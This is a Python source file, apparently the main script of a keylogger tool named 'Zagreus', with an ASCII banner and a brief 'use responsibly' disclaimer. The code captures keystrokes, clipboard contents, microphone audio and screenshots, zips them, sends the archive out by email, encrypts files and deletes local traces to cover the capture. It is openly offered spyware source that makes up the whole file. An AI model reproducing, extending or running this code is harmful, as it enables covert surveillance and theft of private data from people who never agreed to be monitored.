# from sysinfo import computer_information
from clipboard import copy_clipboard
from keystroke import log_keystrokes
from microphone import record_microphone
from screenshot import capture_screenshot
from sendmail import send_email
from encryption import encrypt_files
import os
import zipfile
from pynput.keyboard import Key, Listener
from threading import Lock
import logging
import sys
import subprocess
from typing import List

import sys
import subprocess
from typing import List

def install_package(package: str) -> None:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except subprocess.CalledProcessError:
        print(f"Failed to install {package}. Please install it manually.")
        sys.exit(1)

try:
    from pyfiglet import Figlet
except ImportError:
    install_package('pyfiglet')
    from pyfiglet import Figlet

try:
    from colorama import Fore, Style, init
except ImportError:
    install_package('colorama')
    from colorama import Fore, Style, init

init(autoreset=True)

def display_banner() -> None:
    """Display a stylized banner with ASCII art and text."""

    man: List[str] = [
        r"         ,;;;,     ",
        r"        ;;;;;;;    ",
        r"     .- `\, '/_    ",
        r"  .'   \  (`(_)   ",
        r" / `-,. \ \_/      ",
        r" \  \/ \ `--`     ",
        r"  \  \  \         ",
        r"   / /| |         ",
        r"  /_/ |_|         ",
        r" ( _\ ( _\        "
    ]
    figlet = Figlet(font='standard')
    type_thief: List[str] = figlet.renderText('Zagreus').split('\n')

    left_width: int = 11
    max_lines: int = max(len(man), len(type_thief))

    for i in range(max_lines):
        left: str = man[i] if i < len(man) else " " * len(man[0])
        right: str = type_thief[i] if i < len(type_thief) else ""
        print(f"{Fore.RED}{left.ljust(left_width)}{Fore.WHITE}{right}")



    description: str = (
        "[+] Author: St34lthv3ct3r\n"
        "Description: This is an advanced keylogger designed to capture and log keystrokes.\n"
        "It includes features such as clipboard monitoring, screenshot capture, and more.\n"
        "Use responsibly and only with proper authorization.[+] "
    )
    print(f"{Fore.GREEN}{description}{Style.RESET_ALL}")

display_banner()
def create_file_path(base_path="Keylogger"):
    """
    Creates the file path for the keylogger files.

    :param base_path: The base path for the keylogger files.
    :return: The full path to the keylogger directory.
    """
    base_path = os.path.abspath(base_path)  
    os.makedirs(base_path, exist_ok=True)
    return base_path

def zip_files(file_path):
    files_to_zip = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
        os.path.join(file_path, "f_microphone.wav"),
        os.path.join(file_path, "f_screenshot.png")
    ]
    zip_filename = os.path.join(file_path, "f_logs.zip")
    try:
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for file in files_to_zip:
                if os.path.exists(file):
                    zipf.write(file)
                    logging.info(f"Added file to zip: {file}")
                else:
                    logging.warning(f"File not found: {file}")
    except Exception as e:
        logging.error(f"Error zipping files: {e}")

def cleanup(file_path):
    files_to_delete = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
        os.path.join(file_path, "f_microphone.wav"),
        os.path.join(file_path, "f_screenshot.png"),
        os.path.join(file_path, "f_logs.zip")
    ]
    for file in files_to_delete:
        if os.path.exists(file):
            os.remove(file)
            logging.info(f"Deleted file: {file}")
        else:
            logging.warning(f"File not found: {file}")

def main():
    file_path = create_file_path()

    # Ensure the directory is created before setting up logging
    logging.basicConfig(filename=os.path.join(file_path, "keylogger.log"), level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')
    message_lock = Lock()

    def on_press(key):
        log_keystrokes(file_path, key)

    def on_release(key):
        if key == Key.esc:
            with message_lock:
                logging.info("Keystrokes logging completed.")
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

        # computer_information(file_path)
        # logging.info("System information retrieved.")

        copy_clipboard(file_path)
        logging.info("Clipboard contents copied.")

        record_microphone(file_path)
        logging.info("Microphone recorded.")

        capture_screenshot(file_path)
        logging.info("Screenshot captured.")

        zip_files(file_path)
        logging.info("Files zipped.")

        send_email(os.path.join(file_path, "f_logs.zip"))
        logging.info("Email sent with zipped file.")

        encrypt_files(file_path)
        logging.info("Files encrypted.")

        cleanup(file_path)
        logging.info("Cleanup completed.")

        with message_lock:
            logging.info("Keystrokes logging completed.")

        input("Press any key to exit...")

if __name__ == "__main__":
    main()